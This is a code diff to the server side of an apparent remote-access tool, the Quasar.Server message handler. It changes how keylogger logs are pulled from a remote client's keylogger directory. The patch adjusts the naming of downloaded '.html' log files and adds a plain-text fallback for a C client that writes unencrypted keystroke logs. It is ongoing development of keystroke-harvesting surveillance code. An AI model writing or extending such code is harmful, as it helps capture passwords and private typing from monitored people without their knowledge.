@@ -1,4 +1,4 @@
-﻿using Quasar.Common.Helpers;
+using Quasar.Common.Helpers;
 using Quasar.Common.Messages;
 using Quasar.Common.Models;
 using Quasar.Common.Networking;
@@ -118,7 +118,8 @@ namespace Quasar.Server.Messages
                     return;
                 }
 
-                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), item.Name + ".html", true);
+                string localName = item.Name.EndsWith(".html", StringComparison.OrdinalIgnoreCase) ? item.Name : item.Name + ".html";
+                _fileManagerHandler.BeginDownloadFile(Path.Combine(_remoteKeyloggerDirectory, item.Name), localName, true);
             }
         }
 
@@ -129,7 +130,17 @@ namespace Quasar.Server.Messages
                 try
                 {
                     _completedTransfers++;
-                    File.WriteAllText(transfer.LocalPath, FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance));
+                    string content;
+                    try
+                    {
+                        content = FileHelper.ReadLogFile(transfer.LocalPath, _client.Value.AesInstance);
+                    }
+                    catch
+                    {
+                        /* C client writes plain HTML (no encryption); fall back to raw UTF-8. */
+                        content = File.ReadAllText(transfer.LocalPath, System.Text.Encoding.UTF8);
+                    }
+                    File.WriteAllText(transfer.LocalPath, content);
                     OnReport(_allTransfers == _completedTransfers
                         ? "Successfully retrieved all logs"
                         : GetDownloadProgress(_allTransfers, _completedTransfers));
